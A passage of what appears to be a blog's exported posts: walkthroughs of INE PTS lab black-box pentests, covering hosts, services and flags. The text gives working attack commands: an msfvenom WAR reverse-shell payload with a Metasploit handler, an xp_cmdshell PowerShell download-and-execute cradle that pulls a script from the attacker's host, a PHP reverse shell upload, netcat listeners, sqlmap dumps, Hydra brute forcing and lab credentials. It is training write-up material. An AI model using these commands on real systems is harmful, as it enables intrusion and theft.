file.However, if we look at the gobuster results above, there is also an upload.php form at /app/upload.php.One approach could be to intercept and modify the request to be sent to upload.php page to test its functionality.The modified response indicated that the file was uploaded! The file was uploaded to the /app/upload directory.This endpoint accepted the .txt extension but we can try to upload a PHP reverse shell 4. Modifying the PHP reverse shell to use our IP address and keeping the port same at 1234 as well as setting up a netcat listener at the same port, we should be ready to go.With the rev.php file successfully uploaded, our netcat listener caught the reverse shell connection.With access to the shell as the www-data user, we found the flag in the /var/www/html directory.And with that, we have successfully found all of the flags!ReflectionThis black-box pentest was significantly more challenging than the first one. Once again, this was a fantastic experience and INE did a good job of making it realistic enough where they included vectors that had no exploitation path.I encountered two situations which required me to briefly glance at the writeup and both situations did not require it if I put in the effort to enumerate and map out the application a bit more. The first situation occurred when I used Bash commands in the Admin Console instead of trying to analyze the other types of consoles it could have been such as PHP. The second situation occurred when I did not make the connection that there were two different upload.php scripts. This was not as obvious but it will compel to make sure I analyze an application fully in the future.With those two out of the way, I learned many things as well: Querying a DNS server using nslookup for subdomain enumeration Using sqlmap to dump the database of an application at an injection point Modifying the MD5 hash of a user in a MySQL database using an SQL query Cracking hashes using Hashcat and John the Ripper Using Burpsuite to intercept and modify requestsUseful Commands and InformationHydrahydra -L usernames.txt -p CHANGEME -s 2222 172.16.64.166 ssh -L: List of usernames -p: Use the same password for all usernames -s: Use the port if it’s not on the default port for that service 172.16.64.166: target ssh: service to targetMySQLLog in to MySQL service at a custom port.mysql -P 13306 -u john1 -ppassword123 -h 172.16.64.81Note: no space between the -p flag and the password. No database is specified here.A MySQL contains several default databases, this includes: information_schema mysql performance_schema sysSqlmapOnce you found an injection point, you can use sqlmap to use various injection techniques to gain access to the database.sqlmap -u http://url?id=1The following commands will provide a systematic approach to list the databases, then the tables of a database, the columns of each table and then provide a complete dump of the table.sqlmap -u http://url?id=1 --dbs # Lists the databasessqlmap -u http://url?id=1 -D footracking --tables # Lists the tables in the footracking databasesqlmap -u http://url?id=1 -D footracking -T users --columns # List columns of the users tablesqlmap -u http://url?id=1 -D footracking -T users -dump # Dump all the data in the users tableConsole Language TestingWhen I come across a console in the web, I will typically try bash commands to obtain a response. However, it’s also useful to test commands in the language that the web server is being hosted in.phpinfo(); is a useful command to get info about the system along with the PHP details.References https://book.hacktricks.xyz/pentesting/6379-pentesting-redis &#8617; https://book.hacktricks.xyz/pentesting/pentesting-dns#using-nslookup &#8617; https://gist.github.com/rshipp/eee36684db07d234c1cc &#8617; https://github.com/pentestmonkey/php-reverse-shell &#8617; " }, { "title": "PTS: Black-Box Penetration Test 1", "url": "/posts/black-box-pentest-1/", "categories": "Cybersecurity", "tags": "INE, PTS, eJPT, pentesting, writeup", "date": "2021-08-18 18:00:00 -0400", "snippet": "This is the 1st writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification.Scenario You a...", "content": "This is the 1st writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification.Scenario You are responsible for engaging in a Black-box Penetration Test for the 172.16.64.0/24 range. Your goal is to read the flag file on each machine. On some of them, you will be required to exploit a remote code execution vulnerability in order to read the flag.Now that we have a target space and instructions, let’s get right into it.Enumeration &amp; ExploitationThe first step is to determine the available machines in the network ignoring our own attack machine’s address at 172.16.64.10. We’ll use fping to perform a quick network scan. Alternatively, we could use nmap for host discovery which provides the added advantage of ARP requests along with ICMP requests.Fping command options: -a: show only alive hosts -g: perform a network scan 2&gt;/dev/null: redirect all error messages to nullFrom the scenario instructions, each of the target machines contain a flag that we must be able to read. Let’s begin by exploring the first machine.172.16.64.101The first step is to enumerate the services, OS detection, and service version detection using Nmap.A detailed nmap scan of the top 1000 ports reveals 3 open ports: 22 (SSH) 8080 (Apache Tomcat) 9080 (Apache Tomcat)There were no exact OS matches but the OpenSSH version reveals that this is an Ubuntu Linux machine.SSHThere’s not much to do with SSH except banner grab if there is no potential username or password lists. There was no displayed banner in this situation either.HTTP 8080 (Apache Tomcat)The first few basic enumeration steps I perform for a web application include exploring the content and all hyperlinked pages, viewing the source code for hints, and checking for robots.txt. If none of those enumeration steps lead to any results, we can move on to directory enumeration.With gobuster and the common.txt wordlist found in the SecLists repo, there are two entries of interest that we can explore. Both will lead to the same application so either “/manager” or “/host-manager” is fair game.The “/manager” will redirect us to “/manager/html” which is protected by HTTP Basic Authentication. We can use Burpsuite or Hydra to attempt to brute force the login page using common credentials for the Tomcat Manager page1.NOTE: Too many unsuccessful attempts could lock out the account in which case, the lab would need to reset which I unfortunately had to do.We received access to the Manager’s landing page using the credentials tomcat:s3cret which I’ve previously come across on Hack the Box.With administrative access to the Web Application Manager, we can obtain a reverse shell by deploying a WAR application2. It is possible to exploit this service using Metasploit’s tomcat_mgr_upload exploit but I will attempt this manually.The first step is to generate a WAR executable using msfvenom and a valid Meterpreter payload.msfvenom -p java/meterpreter/reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o rshell.war.Breaking down the above command: -p java/meterpreter/reverse_tcp: Staged Meterpreter payload LHOST=172.16.64.10: Attacker machine’s IP address to connect back to LPORT=4444: Attacker machine’s port to connect back to -f war: Output format as a war file -o rshell.war: Save the payload to rshell.warWith a meterpreter payload, we will have to create a handler in Metasploit to deploy the staged Meterpreter shell. We could have used a java/shell_reverse_tcp payload which is stageless and catchable by netcat but I wanted to try something outside of my usual tactics.Use the exploit/multi/handler module in Metasploit and configure the options with the same payload, listening host, and listening port as selected in the msfvenom payload. All that’s left is to run the handler.Back to the Tomcat Application Manager page, upload the deploy the rshell.war file. Once uploaded, the deployed application will execute the WAR file once we browse to /rshell. Switching back to the Metasploit, an open Meterpreter session will be waiting for us!We obtained a Meterpreter shell as the tomcat8 user. There is no need for privilege escalation as the excepted flag files are accessible by this service user in the adminels and developer user’s home directory.There wasn’t much post-exploitation data to obtain so we can be confident that this machine has been fully compromised and we can move on to the next.172.16.64.140First step is the same as the previous machine which is to run an Nmap scan.Looks like there’s only 1 HTTP port running Apache on an Ubuntu OS.HTTPUsing my initial set of steps enumerating a web application, there were no obvious details so we’ll perform the directory enumeration using gobuster and the directory-list-2.3-small.txt wordlist also a part of the SecLists repository. The only interesting endpoint is the /project endpoint.Browsing to this endpoint in the web browser, we see it’s protected by HTTP Basic Authentication. The site leaves a note that says “admin”. Attempting to use admin:admin as a hunch for the credentials provided us access!We land upon a business solutions page but browsing the application and any hyperlinked pages did not lead anywhere. Let’s perform further directory enumeration using dirbuster. The reason for choosing dirbuster over gobuster this time is that the former will perform recursive searches which may be useful for nested directories while the latter lacks this functionality.Once we configured dirbuster with the target information, selected wordlist, and the username and password for the /project endpoint’s basic authentication (You can do this by selecting Options -&gt; Advanced Options -&gt; Authentication Options), there are several text files at the endpoint /project/backup/test.Two of these files, sdadas.txt and test1.txt contain interesting information along with the sdadas.txt including a line that points to the location of the flag for this machine!# sdadas.txtDriver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;/var/www/html/project/354253425234234/flag.txt# test1.txthttps://stackoverflow.com/questions/1134319/difference-between-a-user-and-a-login-in-sql-serverFor most Apache web services, the root path of the web server is located at /var/www/html. Therefore, browsing to /project/354253425234234/flag.txt provides us access to the below text file.Congratulations, you exploited this machine!Now continue to others.Assessing the other data in the two text files, there are potentially valid credentials to a MS SQL Server database which might be useful in the remaining machines.172.16.64.182With no valid credentials, there is little value in brute forcing the SSH service unless we are able to find credentials by enumerating the other machines further. We will revisit this machine later.172.16.64.199The Nmap results display several services on a Windows machine including the MS SQL service which is where the credentials from the 2nd must be used along with SMB. There isn’t much other interesting information so let’s explore these services starting with the SMB service.SMBAttempting to list the SMB shares using smbclient returned access denied so let’s move on to the SQL service.MS SQLWe could use Metasploit’s mssql modules to login, enumerate, and generate a reverse shell but let’s use IMPacket’s mssqlclient for another manual attempt at exploitation.IMPacket’s mssqlclient.py module allows you to connect to the SQL database with valid credentials and execute system commands. We can generate a reverse shell using Nishang’s Invoke-PowershellTcp.ps1 script3. However, before we use this Python module, we need to configure a few things.Prepare Reverse ShellOnce we have the Powershell script from the nishang repository, I added the following line to the bottom of the file so that Powershell will execute the command once the script is ran.Invoke-PowershellTcp -Reverse -IPAddress 172.16.64.10 -Port 4444Netcat ListenerCreate a netcat listener to capture the reverse shell at port 4444. By default, the following command will listen on all interfaces.nc -nvlp 4444Python ServerA simple HTTP server needs to be stood up so that we can transfer Nishang’s Powershell script to the target machine. This will all make more sense below!Note: The server is running on port 80 to potentially evade any firewalls for uncommon ports as port 80 is typically allowed.python3 -m http.server 80Once the above is configured, we can connect the steps above to receive our reverse shell. The initial setup of all these services looks like the following.At the SQL prompt, run enable_xp_cmdshell to enable the xp_cmdshell feature which will allow us to run system commands. Next, we will download the reverse shell script from our simple HTTP server. This will trigger the last line in the rev.ps1 to be executed by Powershell and our netcat listener will catch the reverse shell.In the top right pane is the request for the rev.ps1 file and in the bottom pane, we caught the reverse shell as the NT_AUTHORITY\\System user. The command in the top-left pane is the system command to download a file and execute it using Powershell.With a Powershell prompt at our disposal, we can search for all text files from the Users directory. Get-ChildItem -Path C:\\Users -Recurse -Filter \"*.txt\"Within the AdminELS user’s Desktop directory, there are three files, one of which is the flag and the other is an id_rsa.pub file.We have fully exploited this machine and we also have an id_rsa.pub file which is likely the public key required to connect to the 3rd machine’s SSH service.172.16.64.182 RevisitedWith the SSH public key from the post-exploitation stage of the 4th machine, we are ready to explore the 3rd machine. ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22#############################################################################################################################################################################################However, this doesn’t look like a valid public key. Fortunately for us, the credentials are present in the data as developer:dF3334slKw. After connecting, the flag is readily available in the developer user’s home directory. With that, we have obtained a flag from each target machine and completed the black-box penetration test!ReflectionI have experience with THM and HTB’s single machine exploitation but this is the first network pentest in a simulated environment that I have done and it was incredibly fun. I highly recommend INE’s PTS course which is free to take as part of their Starter Pass (could change later) and contains all the study material necessary to take the eJPT certification.In terms of this specific penetration test, one of my biggest weaknesses is not fully enumerating a potential attack vector before moving on to the next one. As everyone says, enumeration is the most important stage and it is definitely something to focus on moving forward.Reflection on what I learned with this practical simulated penetration test: Utilizing IMPacket’s MSSQLClient module to generate a reverse shell Using fping and nmap to perform network sweeps and individual machine scans Generating a Meterpreter payload using msfvenom and catching it using Metasploit’s handler module Exploiting Apache Tomcat applications Directory enumeration (recursive or non-recursive) Brute forcing HTTP basic authentication using Burpsuite or Hydra (not displayed but I tried it just to see how it would work. I will display the command below).Useful CommandsAt the end of each writeup, I’ll include a section on the useful commands or set of commands that I learned about and used for future use.Hydra HTTP Basic AuthenticationHydra’s http-get module will brute force HTTP GET authentication. You are able to specify the authentication method but the default is BASIC authentication. Use the browser’s developer tools or Burpsuite to determine the authentication endpoint.hydra -L usernames.txt -P passwords.txt 172.16.64.101 http-get /manager/htmlMsfvenom WAR payload with Metasploit HandlerTo exploit an Apache Tomcat Manager application with a WAR executable using MSFvenom, use the following command.msfvenom -p java/meterpreter/reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o rshell.warSince this is a staged Meterpreter payload, we’ll have to use Meterpreter’s multi handler to catch the reverse shell. Run the following commands once you are in the msfconsole.use exploit/multi/handlerset PAYLOAD java/meterpreter/reverse_tcpset LHOST 172.16.64.10set LPORT 4444runNetwork ScanningTo map a network, we can run either two commands.fping -a -g 172.16.64.0/24 2&gt;/dev/nullsudo nmap -sn 172.16.64.0/24 -sn: disables port scanThe advantage of the nmap scan over fping is that nmap will also send ARP requests.Service EnumerationTo analyze the services, their versions, OS detection, scan all ports, and save the file:sudo nmap -sC -sV -O -oN nmap/scan-results.txt 172.16.64.101 -sC: Run default scripts -sV: Port version detection -O: OS detection -oN: Save the scan results to a fileDirectory Enumerationgobuster dir -u http://172.16.64.101:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -x \"php,jsp\" -u: Target URL -w: Wordlist -t: Number of threads -x: Additional extensions to append to the words in the wordlistFile SearchingMeterpretersearch -f \"*.txt\"PowershellGet-ChildItem -Path C:\\Users -Recurse -Filter \"*.txt\"MSSQL Reverse ShellConnect to MSSQL Server using IMPacket’s mssqlclient.py module.python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py fooadmin:fooadmin@172.16.64.199Once connected, enable system commands with enable_xp_cmdshell and create a reverse shell using the Powershell command.xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\\\"http://172.16.64.10:80/rev.ps1\\\")This involves initializing an HTTP web server to serve the file as well as a netcat listener to catch the reverse shell. In this case, rev.ps1 is the Invoke-PowerShellTcp.ps1 file from the nishang repository.References https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown. &#8617; https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell &#8617; https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/ &#8617; " } ]
